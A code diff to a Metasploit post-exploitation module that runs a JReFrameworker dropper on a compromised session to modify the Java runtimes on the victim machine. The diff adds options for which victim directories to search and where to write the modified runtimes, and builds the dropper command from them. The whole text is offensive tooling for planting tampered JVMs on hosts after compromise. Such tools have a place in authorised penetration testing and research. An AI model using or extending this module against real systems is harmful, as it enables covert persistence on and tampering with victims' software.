@@ -27,9 +27,16 @@ class Metasploit3 < Msf::Post
        ],
       'SessionTypes'  => [ 'shell', 'meterpreter' ]
     ))
+
     register_options(
       [
         OptPath.new('PAYLOAD_DROPPER', [true, 'The JReFrameworker payload to execute'])
+      ], self.class)
+
+    register_advanced_options(
+      [
+        OptString.new('SEARCH_DIRECTORIES', [false, 'Specifies a comma separated list of victim directory paths to search for runtimes, if not specified a default set of search directories will be used.']),
+        OptString.new('OUTPUT_DIRECTORY', [false, 'Specifies the output directory to save modified runtimes, if not specified output files will be written as temporary files.'])
       ], self.class)
   end
 
@@ -67,11 +74,20 @@ class Metasploit3 < Msf::Post
 
     print_status("ReFrameworking JVMs on #{session.inspect}...")
     
-    # todo: handle specified runtime search directories
+    # build the dropper command
+    search_directories = datastore['SEARCH_DIRECTORIES']
+    cmd = "java -jar #{dropper_remote}"
+    if search_directories
+      cmd = "#{cmd} --search-directories \"#{search_directories}\""
+    end
+    output_directory = datastore['OUTPUT_DIRECTORY']
+    if output_directory
+      cmd = "#{cmd} --output-directory #{output_directory}"
+    end
 
     # rework each discovered runtime
-    modification_results = cmd_exec("java -jar #{dropper_remote}")
-
+    print_status("Running: #{cmd}...")
+    modification_results = cmd_exec(cmd)
     print_status(modification_results)
 
     # parse the results, results are a list of original and corresponding modified runtimes
